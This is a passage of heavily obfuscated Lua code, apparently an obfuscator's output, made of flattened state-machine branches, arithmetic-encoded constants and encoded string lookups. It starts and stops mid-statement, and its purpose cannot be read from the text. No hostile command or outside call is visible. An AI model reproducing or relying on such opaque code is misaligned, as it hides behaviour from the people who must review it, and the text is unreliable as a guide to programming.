AR=jR(dR,J,rR,QR)QR=7.60138583501e+014%7104098969752 WR[UR]=AR WR=Q[IR]rR=t(478831+-484205)jR=Q[i]AR=Q[f]dR=AR(rR,QR)UR=jR[dR]QR,jR,OR=-434861+9794972272207,-368426-(-368427),333162+13043139648009 WR[UR]=jR rR=t(-36192-(-30689))WR=Q[IR]jR=Q[i]AR=Q[f]dR=AR(rR,QR)UR=jR[dR]QR,bR=t(-608243+602709),t(807609+-813166)AR=Q[i]dR=Q[f]rR=dR(QR,OR)jR=AR[rR]QR=35017936758332-(-268584)WR[UR]=jR WR=Q[IR]jR=Q[i]iR=11157591156323-(-639540)AR=Q[f]rR=t(306986+-312344)dR=AR(rR,QR)UR=jR[dR]dR=t(922894-928701)AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)dR=rR[OR]jR=AR[dR]rR,dR,QR=515560-515440,640884+-640764,484795-484655 AR=jR(dR,rR,QR)WR[UR]=AR WR=Q[IR]QR=19889527592020-805881 jR=Q[i]AR=Q[f]rR=t(-473891-(-468207))dR=AR(rR,QR)QR=9805710369380-786104 UR=jR[dR]jR=505915-505904 WR[UR]=jR WR=Q[IR]rR,iR=t(-165932-(-160229)),t(850765-856315)jR=Q[i]AR=Q[f]dR=AR(rR,QR)rR=t(-1033920+1028534)UR=jR[dR]dR=o[rR]QR=Q[i]OR=Q[f]bR=OR(iR,NR)rR=QR[bR]AR=dR[rR]rR=Q[i]NR=11999430509429-(-567346)QR=Q[f]iR,bR=-53922+10807541332467,t(-837434+831800)OR=QR(bR,iR)dR=rR[OR]jR=AR[dR]WR[UR]=jR WR=Q[IR]jR=Q[i]AR=Q[f]rR,QR=t(-229223+223770),31468038832301-609843 dR=AR(rR,QR)rR=t(795183-800569)UR=jR[dR]iR=t(123897-129252)dR=o[rR]QR=Q[i]OR=Q[f]bR=OR(iR,NR)rR=QR[bR]AR=dR[rR]rR=Q[i]QR=Q[f]bR,iR=t(-502568-(-496879)),27788212784058-91811 OR=QR(bR,iR)dR=rR[OR]jR=AR[dR]QR,OR=11840511687004-(-750007),25827500348567-63138 WR[UR]=jR rR=t(-183983-(-178598))WR=Q[IR]jR=Q[i]AR=Q[f]dR=AR(rR,QR)UR=jR[dR]jR,QR=15727744-(-607603)~=500144+-163749,26020779143735-(-568434)WR[UR]=jR WR=Q[IR]rR=t(-1037376+1031779)jR=Q[i]AR=Q[f]dR=AR(rR,QR)NR=2849797205164-(-564658)UR=jR[dR]jR=Q[a]WR[UR]=jR jR=t(-159717+154252)UR=o[jR]bR=t(-511408+505643)AR=Q[i]dR=Q[f]QR=t(402092+-407765)rR=dR(QR,OR)jR=AR[rR]OR=22492355444373-(-955198)WR=UR[jR]AR=Q[i]QR=t(339115+-344803)dR=Q[f]rR=dR(QR,OR)jR=AR[rR]L=nil UR=WR(jR)rR,QR=t(34145+-39906),9107755095267-(-1002559)jR=Q[i]AR=Q[f]dR=AR(rR,QR)WR=jR[dR]iR,dR=31313414214652-(-466414),t(674933+-680631)AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)dR=rR[OR]OR,QR=-532771-(-532785),907132+-907132 jR=AR[dR]dR,rR=877755-877755,2609042000%14824101 AR=jR(dR,rR,QR,OR)rR=t(771899-777400)UR[WR]=AR jR=Q[i]QR=19006884375054-304361 AR=Q[f]dR=AR(rR,QR)iR=14757957046194-(-959998)WR=jR[dR]dR=t(375530-381228)AR=o[dR]bR=t(904380+-909809)rR=Q[i]QR=Q[f]OR=QR(bR,iR)QR=400282-400172 dR=rR[OR]rR=637108-637108 jR=AR[dR]dR=116778484%1536559 AR=jR(dR,J,rR,QR)rR,QR=t(762069-767480),-700918+14448711624326 UR[WR]=AR jR=Q[i]AR=Q[f]dR=AR(rR,QR)WR=jR[dR]C,jR=nil,188422310%6078139 UR[WR]=jR jR=Q[i]AR=Q[f]rR,QR=t(-852880-(-847290)),24423003039415-(-78370)dR=AR(rR,QR)OR=-970302+4929700126765 WR=jR[dR]AR=Q[i]QR=t(-538161+532559)dR=Q[f]rR=dR(QR,OR)bR=t(427996-433581)jR=AR[rR]iR,rR=13759348501001-866299,t(363115+-368732)UR[WR]=jR jR=Q[i]QR=7365020299766-366379 AR=Q[f]dR=AR(rR,QR)WR=jR[dR]dR=t(135460+-141267)AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)dR=rR[OR]rR,QR=3570222614%14454342,1121046677%4938531 jR=AR[dR]dR=-801901-(-802041)AR=jR(dR,rR,QR)UR[WR]=AR QR,rR=-340267+12147612310876,t(-37046-(-31585))jR=Q[i]AR=Q[f]dR=AR(rR,QR)WR=jR[dR]jR=828421-828410 UR[WR]=jR rR=t(697248-703030)jR=Q[i]QR,iR=344363+16959195577479,t(245800+-251351)AR=Q[f]dR=AR(rR,QR)WR=jR[dR]rR=t(-600572-(-595186))dR=o[rR]QR=Q[i]OR=Q[f]bR=OR(iR,NR)iR=25840384954062-(-626483)rR=QR[bR]AR=dR[rR]rR=Q[i]QR=Q[f]bR=t(439854+-445356)OR=QR(bR,iR)dR=rR[OR]rR=t(-507056+501530)jR=AR[dR]QR=17199721185194-(-245480)UR[WR]=jR jR=Q[i]AR=Q[f]dR=AR(rR,QR)rR,iR,NR=t(-460984-(-455598)),t(-501872+496218),608755+13504862447406 WR=jR[dR]dR=o[rR]QR=Q[i]OR=Q[f]bR=OR(iR,NR)iR=28758904309804-(-614515)rR=QR[bR]AR=dR[rR]rR=Q[i]bR=t(-455598+449780)QR=Q[f]OR=QR(bR,iR)dR=rR[OR]jR=AR[dR]UR[WR]=jR QR,rR=31019199929704-(-512880),t(-702369-(-696822))jR=Q[i]AR=Q[f]dR=AR(rR,QR)AR=t(432749+-438214)WR=jR[dR]OR=t(441147-446574)jR=Q[a]bR=-878075+32851060776317 UR[WR]=jR jR=o[AR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]WR=jR[AR]bR=18477512712393-(-483951)dR=Q[i]rR=Q[f]OR=t(220527-226343)QR=rR(OR,bR)OR=t(166885+-172274)AR=dR[QR]jR=WR(AR)WR=b()bR=19762821140477-(-243688)Q[WR]=jR jR=Q[WR]NR=t(-777912+772303)dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]QR=t(312426+-318124)rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]dR=rR[QR]iR,QR,bR,OR=930877+-930717,609130221%4143743,268175868%3013212,-178630-(-178854)rR=dR(QR,OR,bR,iR)jR[AR]=rR jR=Q[WR]NR=t(629322-634804)dR=Q[i]x,bR,fR,OR=nil,-756407+26304256961128,10022612606247-555185,t(466361-472047)rR=Q[f]QR=rR(OR,bR)AR=dR[QR]QR=t(-357035+351337)rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]OR,bR=1387677144%7975156,2629042866%12401145 dR=rR[QR]QR=1839219624%13933482 rR=dR(QR,J,OR,bR)OR,NR=t(719322-724918),t(1001138-1006719)jR[AR]=rR jR=Q[WR]dR=Q[i]fR=19456795852847-227687 rR=Q[f]bR=32725428843839-572978 QR=rR(OR,bR)kR=9207617417128-282153 AR=dR[QR]QR=t(-910315-(-904508))rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]OR,bR=1988655262%15065570,785238-785208 dR=rR[QR]QR=689333+-689311 rR=dR(QR,OR,bR)iR=78498+21746082978938 jR[AR]=rR jR=Q[WR]bR=-163877+18281012609702 dR=Q[i]rR=Q[f]OR=t(-566386+560762)QR=rR(OR,bR)OR=t(472181-477743)AR=dR[QR]bR,dR=-1014719+2824028194309,-59106-(-59106)jR[AR]=dR jR=Q[WR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)bR=t(-395914-(-390380))AR=dR[QR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)bR=619315+1473218122281 dR=rR[OR]jR[AR]=dR fR,iR=1139273835110-(-1008063),2410623711133-(-250152)jR=Q[WR]NR,OR=t(277545+-283263),t(154710-160293)dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]rR=Q[i]QR=Q[f]bR=t(1030594-1036032)OR=QR(bR,iR)dR=rR[OR]OR,bR=t(-970238+964759),12848786084040-(-695798)jR[AR]=dR jR=Q[WR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]QR=t(864716-870523)rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]dR=rR[QR]OR,bR,QR=504771095%2884405,1250977134%11801669,1934601008%16677593 rR=dR(QR,OR,bR)bR=28086722840678-811577 jR[AR]=rR NR=t(-226087+220495)jR=Q[WR]OR=t(-592946+587315)dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]fR,QR=13410371666433-774456,t(-824250+818443)rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)bR=456325244%4225233 QR=OR[iR]OR=609075+-609005 dR=rR[QR]fR,QR=t(890836-896572),-57372-(-57442)rR=dR(QR,OR,bR)jR[AR]=rR bR=33135610466548-301161 jR=Q[WR]dR=Q[i]OR=t(-348779+343280)rR=Q[f]QR=rR(OR,bR)AR=dR[QR]OR,dR,bR=t(695185-700982),-666293+666305,34478901412150-(-769080)jR[AR]=dR jR=Q[WR]dR=Q[i]rR=Q[f]QR=rR(OR,bR)OR=t(-49826+44440)AR=dR[QR]QR=o[OR]bR=Q[i]w=k(w)iR=Q[f]NR=iR(fR,kR)OR=bR[NR]rR=QR[OR]OR=Q[i]bR=Q[f]NR,fR,kR=t(196966+-202364),2083123324039-613619,2036950648721-245800 iR=bR(NR,fR)QR=OR[iR]dR=rR[QR]jR[AR]=dR OR=t(999167+-1004905)jR=Q[WR]dR=Q[i]bR=26161443465846-(-718006)rR=Q[f]QR=rR(OR,bR)AR=dR[QR]dR=497583+5654797>549489+10338524 jR[AR]=dR jR=Q[WR]OR,bR=t(-714806+709015),750391+33207552312727 dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]OR,dR=t(-277583-(-272168)),1208637121%8936722<694326+13853574 jR[AR]=dR jR=Q[WR]bR=22219618209670-556721 dR=Q[i]rR=Q[f]QR=rR(OR,bR)AR=dR[QR]OR=t(382178-387564)QR=o[OR]bR=Q[i]iR=Q[f]fR=t(978238+-983971)NR=iR(fR,kR)OR=bR[NR]fR,NR=26216207158094-469999,t(-497500-(-492143))rR=QR[OR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)bR=649716+34456352265061 QR=OR[iR]dR=rR[QR]jR[AR]=dR jR=Q[WR]dR=Q[i]rR=Q[f]OR,kR=t(84643+-90068),607603+10729155125653 QR=rR(OR,bR)fR=t(-10720+4939)p=k(p)AR=dR[QR]OR=t(90841-96227)QR=o[OR]bR=Q[i]iR=Q[f]NR=iR(fR,kR)OR=bR[NR]rR=QR[OR]OR=Q[i]NR,fR=t(-702184-(-696566)),35069477520927-(-686453)bR=Q[f]iR=bR(NR,fR)H=nil QR=OR[iR]OR=t(1040537-1046336)dR=rR[QR]jR[AR]=dR jR=Q[WR]bR,fR=-176933+5455848883966,-233127+19304319866081 dR=Q[i]rR=Q[f]NR=t(-88675+83099)QR=rR(OR,bR)AR=dR[QR]dR=Q[a]jR[AR]=dR jR=Q[S]bR=t(458906-464302)dR=Q[WR]rR=758968+-758963 AR=jR(dR,rR)iR,dR,kR=26732692125660-(-141668),t(-978814+973349),235815+3230987514522 AR=o[dR]rR=Q[i]QR=Q[f]OR=QR(bR,iR)iR=821113+30399631681310 dR=rR[OR]jR=AR[dR]rR=Q[i]QR=Q[f]bR=t(598067+-603638)OR=QR(bR,iR)dR=rR[OR]OR=t(934717+-940529)AR=jR(dR)dR=Q[i]rR=Q[f]bR=28969364053550-(-690997)QR=rR(OR,bR)jR=dR[QR]QR=t(-745337-(-739639))rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]dR=rR[QR]QR,OR,iR,bR=374849235%1469997,702614-702390,2024738688%13233586,-488879+488879 rR=dR(QR,OR,bR,iR)OR=t(-700278+694469)AR[jR]=rR NR,bR,fR=t(877091-882747),-614195+28298256238117,293097+18209069254997 dR=Q[i]rR=Q[f]QR=rR(OR,bR)jR=dR[QR]QR=t(418603-424301)rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]bR,OR=895036+-894744,901436-901436 dR=rR[QR]QR=-12896+12896 rR=dR(QR,J,OR,bR)AR[jR]=rR OR=t(974910+-980368)dR=Q[i]bR,NR=3970818890464-445550,t(129915-135460)rR=Q[f]QR=rR(OR,bR)jR=dR[QR]QR=t(-737975+732168)rR=o[QR]OR=Q[i]fR=146085+3367356977563 bR=Q[f]iR=bR(NR,fR)QR=OR[iR]OR=3472510493%13834703 dR=rR[QR]bR,QR=-448166-(-448366),-315250-(-315370)rR=dR(QR,OR,bR)OR=t(341436-347179)AR[jR]=rR NR=t(-467694+462258)dR=Q[i]bR=14713932462223-(-785656)rR=Q[f]QR=rR(OR,bR)jR=dR[QR]dR=2080158735%8287485 AR[jR]=dR OR=t(856942-862651)dR=Q[i]rR=Q[f]bR,iR=14236103049498-(-504496),246568+27534801641731 QR=rR(OR,bR)jR=dR[QR]bR=t(6230-11680)rR=Q[i]QR=Q[f]OR=QR(bR,iR)dR=rR[OR]OR=t(-524848+519282)AR[jR]=dR dR=Q[i]bR=1043904+19030506067835 rR=Q[f]fR=13296551364561-579442 QR=rR(OR,bR)jR=dR[QR]QR=t(13408+-19215)rR=o[QR]OR=Q[i]bR=Q[f]iR=bR(NR,fR)QR=OR[iR]dR=rR[QR]OR,QR,bR=651379-651124,1056+-801,-647348+647603 rR=dR(QR,OR,bR)AR[jR]=rR OR,UR=t(356203+-361719),nil dR=Q[i]rR=Q[f]bR,fR=-23457+23411507474636,t(-259460-(-253800))QR=rR(OR,bR)bR,OR=17745198277978-(-645940),t(-444782+439020)jR=dR[QR]dR=-549489+549502 AR[jR]=dR dR=Q[i]rR=Q[f]v=nil QR=rR(OR,bR)OR=t(-261672+256286)jR=dR[QR]QR=o[OR]bR=Q[i]iR=Q[f]NR=iR(fR,kR)OR=bR[NR]rR=QR[OR]NR=t(-62370+56548)OR=Q[i]fR=31343480437096-67426 bR=Q[f]kR=483119+14876072728303 iR=bR(NR,fR)QR=OR[iR]dR=rR[QR]iR=t(-943293+937572)AR[jR]=dR fR=t(354964-360555)dR=Q[i]OR=t(871803+-877466)rR=Q[f]NR,bR=-93923+20940752206609,24133083477660-(-500015)QR=rR(OR,bR)rR=422259-422253 jR=dR[QR]dR=Q[a]AR[jR]=dR jR=Q[S]dR=jR(AR,rR)rR=t(-333955-(-328490))dR=o[rR]QR=Q[i]OR=Q[f]bR=OR(iR,NR)rR=QR[bR]iR=t(735291-740855)jR=dR[rR]QR=Q[i]OR=Q[f]NR=30686329297442-(-1021312)bR=OR(iR,NR)iR=30335206793235-766392 rR=QR[bR]dR=jR(rR)bR=t(-911802-(-906172))rR=Q[i]QR=Q[f]OR=QR(bR,iR)jR=rR[OR]OR=t(1004157-1009855)QR=o[OR]bR=Q[i]iR=Q[f]NR=iR(fR,kR)fR=t(973054+-978530)OR=bR[NR]rR=QR[OR]iR,OR,bR,NR=-628787+628787,-530480-(-530480),-591954-(-592178),15303756%5101242 QR=rR(OR,bR,iR,NR)bR,iR=t(75874+-81271),23498483766318-573106 dR[jR]=QR rR=Q[i]QR=Q[f]kR=-971902+3330849759388 OR=QR(bR,iR)jR=rR[OR]OR=t(-548851-(-543153))QR=o[OR]bR=Q[i]iR=Q[f]NR=iR(fR,kR)OR=bR[NR]rR=QR[OR]OR,fR,iR,bR=153243738%5675694,t(500079+-505653),499439+-499111,171000944%784408 QR=rR(OR,J,bR,iR)dR[jR]=QR iR,bR=836346+35170412182777,t(661103-666869)rR=Q[i]QR=Q[f]kR=435886+7554003825869 OR=QR(bR,iR)jR=rR[OR]OR=t(1015615+-1021422)QR=o[OR]bR=Q[i]iR=Q[f]NR=iR(fR,kR)OR=bR[NR]rR=QR[OR]OR,J,bR,iR=35071-35041,nil,777288-777208,128442-128292 QR=rR(OR,bR,iR)dR[jR]=QR iR=21533475200103-(-487919)rR=Q[i]bR=t(239335+-244844)QR=Q[f]OR=QR(bR,iR)NR=-585586+34680772390300 jR=rR[OR]rR,kR,iR,bR=-514608-(-514608),428781+1073345812,27684056595799-39073,t(97763+-103430)dR[jR]=rR rR=Q[i]QR=Q[f]OR=QR(bR,iR)iR=t(-833492-(-828026))jR=rR[OR]fR=t(-598067+592422)QR=Q[i]OR=Q[f]bR=OR(iR,NR)iR=23233261903941-1035200 rR=QR[bR]bR=t(-561649+556009)dR[jR]=rR rR=Q[i]QR=Q[f]OR=QR(bR,iR)jR=rR[OR]OR=t(-338905-(-333098))QR=o[OR]bR=Q[i]iR=Q[f]NR=iR(fR,kR)OR=bR[NR]iR,bR=-319595-(-319850),909372+-909117 rR=QR[OR]OR=697205-696950 QR=rR(OR,bR,iR)dR[jR]=QR bR=t(-948925+943173)rR=Q[i]iR=30189172450284-(-231911)QR=Q[f]OR=QR(bR,iR)jR=rR[OR]rR=282358-282345 dR[jR]=rR bR=t(-395692+390125)rR=Q[i]QR=Q[f]iR,kR=-819001+8725493161719,t(866594-872251)OR=QR(bR,iR)bR=t(-58732-(-53346))jR=rR[OR]OR=o[bR]iR=Q[i]NR=Q[f]fR=NR(kR,vR)bR=iR[fR]fR=t(941245+-947055)QR=OR[bR]bR=Q[i]iR=Q[f]kR=-773624+29241030490200 NR=iR(fR,kR)OR=bR[NR]rR=QR[OR]dR[jR]=rR rR=Q[i]bR,iR=t(326445-332202),-1026048+28264969637587 QR=Q[f]OR=QR(bR,iR)jR=rR[OR]rR=Q[a]dR[jR]=rR QR=-253224+253230 jR=Q[S]rR=jR(dR,QR)rR=b()QR=b()vR,jR=10735597337870-(-1042944),nil Q[rR]=jR jR={}Q[QR]=jR jR=b()OR=K(3399498598%16934917,{F,i;f,X;N,QR,g;rR;S,tR,IR,jR;Z})kR=t(176037+-181481)IR=k(IR)Q[jR]=OR iR=Q[i]NR=Q[f]g=k(g)fR=NR(kR,vR)kR=t(-222208-(-216679))bR=iR[fR]S=k(S)N=k(N)vR=238375+12029496527004 iR=K(10962735-773112,{rR;WR;i,f,y,X})OR=AR[bR]bR=t(364072-369579)bR=OR[bR]bR=bR(OR,iR)iR=Q[i]NR=Q[f]fR=NR(kR,vR)AR=nil bR=iR[fR]iR=D(-132516+2918393,{rR;QR,u;i,f,Y})OR=dR[bR]bR=t(-798585+793078)bR=OR[bR]rR=k(rR)bR=bR(OR,iR)u=k(u)dR,iR=nil,t(-7751-(-2016))bR=o[iR]F=k(F)NR=Q[i]vR=t(457-6176)QR=k(QR)fR=Q[f]kR=fR(vR,PR)vR=-178918+23625188774104 Z=k(Z)iR=NR[kR]OR=bR[iR]iR=e(15490809-174373,{i,f,s;jR})bR=OR(iR)Y=k(Y)iR=Q[i]kR=t(-960830+955056)NR=Q[f]fR=NR(kR,vR)bR=iR[fR]OR=T[bR]s=k(s)tR=k(tR)iR=G(3662863-(-912508),{i;f;a})WR=k(WR)a=k(a)f=k(f)bR,T=t(-820729+815222),nil bR=OR[bR]y=k(y)bR=bR(OR,iR)i=k(i)X=k(X)jR=k(jR)elseif 939325+1515277>I then I=Q[j[339696-339691]]C,Y=-958590+24948079852352,2400960426346-436398 N=Q[j[660144603%3056225]]l,X,u=15115525822456-876795,-672821+15699658997074,t(835514+-840894)f=Q[j[-1015551+1015555]]w=t(-552305+546515)v=f(u,C)T=t(336298+-342004)i=N[v]v=Q[j[439400259%6188736]]u=Q[j[205357312%7898358]]C=u(T,Y)f=v[C]v=Q[j[591184891%2662995]]C=Q[j[928893+-928890]]T=Q[j[-941177-(-941181)]]Y=T(w,l)l=t(-667549-(-661941))u=C[Y]T=Q[j[695615521%7171294]]Y=Q[j[-703414+703418]]w=Y(l,X)C=T[w]T=Q[j[-361451+361457]]N={[f]=v,[u]=O;[C]=T}O=nil r=I(i,N)I,r=o[t(-51618+46248)],{}else I=r and 12750950-(-241959)or 1422337500%20083302 end end end end else if I<3644687-(-125540)then if 209619710%3898231>I then if 2503916-(-327786)>I then if 325226+2266084>I then u=t(128868+-134337)N=Q[j[278982411%1212967]]C=235303+18154306808548 f=Q[j[627509-627507]]v=f(u,C)i=N[v]r=O[i]C=-883259+22803751914800 N=Q[j[185126541%2501710]]u=t(-529054-(-523568))f=Q[j[-632500+632502]]v=f(u,C)i=N[v]I=r==i I=I and 811577+10139925 or-356395+15341045 elseif I<447406+2251684 then i=b()N,r,I=-17696-(-17697),18673210%1867321,t(-687247-(-681845))f,O=N,U Q[i]=I N,I=324104713%1771064,5464971254%27668301 v=N N=-1043712+1043712 u=N>v N=r-v elseif 3561869-765240>I then r=Q[j[225575+-225574]]I=not r I=I and 2928861106%23686868 or 1807940928%10433342 else l,C=-565234+16870073195857,6097966370973-457326 I=Q[j[640673010%16427513]]u=t(-294405-(-288617))N=Q[j[1045185-1045184]]f=Q[j[-839610+839612]]v=f(u,C)r=N[v]v=Q[j[-496559+496562]]C=Q[j[1023681-1023680]]T=Q[j[310058+-310056]]w=t(-149541+144163)Y=T(w,l)u=C[Y]f=v[u]N=not f I[r]=N I=5462086-(-1002111)end else if I<2629488-(-263144)then I=10689382-(-837626)<=1726947386%15570396 I=I and-185830+6510247 or 1932053617%27051834 elseif 642482818%9545251>I then I,r=o[t(205973-211495)],{i}else r=Q[j[-605875+605877]]O=Q[j[26631985%8877328]]I=r[O]O=I I=O and 625136771%5735087 or 12141267-201062 end end else if I>-790777+3999835 then if 752631+2531949>I then T=-1007038-(-1007039)r=C==T I=r and-815801+17506999 or 449756070%31077301 elseif 364267+3197569>I then I=Q[j[920967-920957]]i=Q[j[99118-99107]]O[I]=i I=Q[j[925641-925629]]i={I(O)}r,I={W(i)},o[t(-445839-(-440366))]else I,r=457479785%4138110,i end else if-950589+4005018>I then u=t(-909247-(-903868))v=o[u]l=10295350079870-(-717814)u=v(i)C=Q[j[53555208%338957]]w,I=t(-749047+743418),13536509-(-345259)T=Q[j[298649903%2447950]]Y=T(w,l)v=C[Y]f=u~=v r=f elseif 2622767-(-507696)>I then V=Q[i]n,oR=V,I I=V and 840762+5570186 or 2992792837%32712167 else r=t(-449582+444207)I=o[r]r={I(O)}I,r=o[t(-868641-(-863035))],{W(r)}end end end else if I>3859797-(-258856)then if I<3656206-(-866171)then if I<3225090-(-974462)then N=-758135+758167 i=Q[j[-499055+499058]]O=i%N X=2477337439%11630691 u=Q[j[-918393-(-918396)]]v=u-O N,u,w=1006133653%15016920,1704302412%7746829,-511152+511154 f=v/u i=N-f v=Q[j[1549534534%6076606]]T=Q[j[3278904554%16560124]]Y=w^i y=416045-415789 C=T/Y Y=-1017663-(-1017664)u=v(C)v=756822726321%4300158623 f=u%v u=-729077-(-729079)v=u^O N=f/v v=Q[j[-555441+555445]]T=N%Y O,Y=nil,4295750968-783672 C=T*Y u=v(C)Y=792145168%4687248 v=Q[j[-300005-(-300009)]]C=v(N)f=u+C T,u=618673-553137,-234665-(-300201)v=f%u i=nil C=f-v u=C/T T=v%Y l=v%X I=4552582120%18309680 w=v-l l=1520962006%8691210 Y=w/l l,f=1303840220%9803308,nil w=u%l s=u%y X=u-s N,u,s=nil,nil,146167926%14616767 l=X/s C={T,Y;w;l}Q[j[1155164297%8078072]]=C v=nil elseif I<-331754+4694895 then r,I={},o[t(210044-215655)]else v,I,l=-841722+35184372930554,{},221543+-221542 Q[j[393260+-393258]]=I r=Q[j[2332483019%9183004]]T,X=t(587826+-593360),l f,l,C=r,881339-881339,154470739%3358054 r=i%v Q[j[-875963+875967]]=r Y=514544+-514543 u=i%C I,C=-562737+8762667,-436526+436528 v=u+C s=X<l Q[j[967294+-967289]]=v u=#O C=t(-400492+394958)N[i]=C C,w=-749303+749322,u l=Y-X end else if I<3948872614%20123494 then O,i=U[29538-29537],U[-835194+835196]N=not i r,I=N,N and 879547+13253109 or-860411+9821196 elseif I<681807171%10258233 then I=Y Y=b()Q[Y]=r X,I,l=-208998+209063,966566734%24492780,2617972896%15309783 r=Q[C]w=r(l,X)B=h(5400533662%23039168,{})l=b()r=1026048+-1026048 Q[l]=w w=r r=45012350%1216550 X,y=r,t(-481647+475843)s=o[y]y={s(B)}r={W(y)}s,q,y,B=r,t(-137124+131503),1690883021%8329473,t(-604147+598476)r=s[y]y=r r=o[B]F=Q[N]R=o[q]q=R(y)R=t(310378+-315795)z=F(q,R)F={z()}B=r(W(F))F=b()r=-255784+255785 Q[F]=B B=Q[l]z=B B=278122-278121 R=B B=2468016804%11321178 q=R<B B=r-R else T,f,I=t(179543-185190),t(-1029201-(-1023680)),556977+7904593 N=o[f]Y=2626452535914-(-118564)v=Q[j[-180902+180903]]u=Q[j[781948510%6409414]]C=u(T,Y)f=v[C]i=N[f]r=i end end else if I<-826554+4620589 then if 1363439282%6972629>I then w=13374937123745-793337 u=Q[j[309099-309098]]Y=t(722358+-727892)C=Q[j[-427115-(-427117)]]I=9220346-216039 T=C(Y,w)v=u[T]N=v elseif I<3749202-(-31265)then u,T=f(v,u)I=u and 1753055531%26354469 or-346987+7117370 else Y,r,w=t(-240615+235085),t(226363-232167),-216807+17935257243686 I=o[r]f=Q[j[152950103%3556979]]u=Q[j[1394573033%12794248]]C=Q[j[-948605+948607]]T=C(Y,w)v=u[T]N=f[v]f=Q[j[823546+-823540]]v={I(N,f,O)}r,i=v[192348492%2161219],v[299689+-299687]N=r r,I=N,N and 2168994-(-389548)or 7814351-926205 end else if I<4285474-363947 then I,r=o[t(-970429-(-964990))],{}elseif I<3842453-(-223463)then I,r=V,oR I=17060522-999103 else O=t(911509-917244)r=o[O]u,v=6010990295810-124196,t(-309482+304066)i=Q[j[1316090774%11646821]]N=Q[j[569652-569650]]f=N(v,u)O=i[f]I=r[O]O=Q[j[367356343%2825818]]r=I(O)I=r and 1489287621%17802272 or 74936558%10161462 end end end end end else if 3844404963%17283855>I then if I<7305727-822842 then if 445742+5506951>I then if I>3985113-(-1025216)then if 559409+4688751>I then O=Q[j[1679169745%15547868]]r=#O O=483334568%5894324 I=r==O I=I and 1708996100%15902694 or 410157+11371323 elseif 143959593%6914003>I then I=2333340265%23178436 else O,v,u=t(-674076-(-668341)),t(574834+-580210),-956414+30304067520060 r=o[O]i=Q[j[496687+-496686]]N=Q[j[-1020160+1020162]]f=N(v,u)O=i[f]I=r[O]O=Q[j[1003522-1003519]]r=I(O)I=r and-556721+8889775 or-163366-(-891964)end else if I<2094065188%9948207 then Y=T N[i]=Y I,T,u,C,f=-577394+3506635,nil,nil,nil,nil elseif 3840482368%18987588>I then i=Q[j[28009699%269324]]N=724005-723958 O=i*N i=235688-235431 r=O%i Q[j[379948+-379945]]=r i=Q[j[-153122-(-153125)]]N=1433747890%9753387 O=i~=N I=O and 3890774-(-251432)or 4896373-(-84003)elseif 92259+4910389>I then Y,f=945213+19818656717788,t(-1051107-(-1045568))N=o[f]T=t(-428077+422567)v=Q[j[32436251%926750]]I=198874533%3646575 u=Q[j[303676527%12147061]]C=u(T,Y)f=v[C]i=N[f]r=i else I=Q[j[-266472+266473]]f,v=t(741589-747127),10859083019186-560177 O=Q[j[-692851-(-692853)]]i=Q[j[417389+-417386]]N=i(f,v)r=O[N]O=-498799+1085569>5830006298%29215101 I[r]=O r,I={},o[t(659892+-665568)]end end else if I<7111289-743607 then if 6175005-48738>I then I=r and 9681095-(-119396)or 1630033-(-940285)elseif-172069+6446308>I then r,T=t(385644+-391315),t(368384-374188)Y=P(13151922-89379,{})f=t(-758188-(-752567))I=o[r]O=Q[j[225575+-225571]]N=o[f]C=o[T]T={C(Y)}C,u=720312-720310,{W(T)}v=u[C]f=N(v)N=t(913171-918588)i=O(f,N)O={i()}r=I(W(O))O=r i=Q[j[904636+-904631]]r,I=i,i and-414893+16068747 or 7557638-(-116452)else r=t(739881-745527)I=o[r]O=t(620083+-625853)r=o[O]O=t(-802681+796911)o[O]=I O,I=t(758264+-763910),-358123+3214146 o[O]=r O=Q[j[904647424%4247171]]i=O()end else if I<1196851886%11337306 then c=931134-931133 V=L[c]I,n=3724233248%23322312,V elseif-858363+7319744>I then C,I,T=nil,934419814%26409254,nil else I,i,r,O=o[t(-866107+860357)],nil,{},nil end end end else if I<79583102%18108969 then if I<1606023016%14945736 then if I<425069+6187868 then r,O,I={},nil,o[t(-438446+432876)]elseif I<1028091598%7979252 then w,C,z=t(844474+-849853),I,-231079+16385800520259 Y=o[w]s=Q[j[877563+-877562]]y=Q[j[328094097%8002295]]F=t(422445+-428086)B=y(F,z)y=t(297961+-303343)X=s[B]l=i[X]B=17118114353504-(-208102)w=Y(l)l=Q[j[145446-145445]]X=Q[j[-1030080+1030082]]s=X(y,B)Y=l[s]T=w==Y I,u=T and 469113322%17730077 or 1981687927%31721417,T else f=t(71734-77090)r=o[f]Y=t(477770-483311)C=Q[j[984902-984895]]Y,I=C[Y],-58658+10154582 T={Y(C)}C={r(W(T))}v,u,f=C[1374416612%13089682],C[208030566%1216553],C[1017846193%11566434]end else if 692917+6278687>I then I=r and-418413+8150361 or 507248+7281534 elseif I<507632+6592744 then I=601131453%9525027 else H,R=26730545410867-692725,t(425837+-431644)z=o[R]S=t(-371420-(-365931))q=Q[j[-46945+46947]]m=Q[j[1477132007%6902486]]I=13610432-(-849914)p=m(S,H)m=247208+-247068 R=q[p]F=z[R]R,q=562161+-562071,607276045%3282573 z=F(R,q,m)y=z end end else if 558938272%23986908>I then if I<2158831921%15705567 then I=4377116148%25813268 elseif I<1203554108%9420063 then f,I=t(643067-648628),3711953-(-855227)~=2716732009%12725125 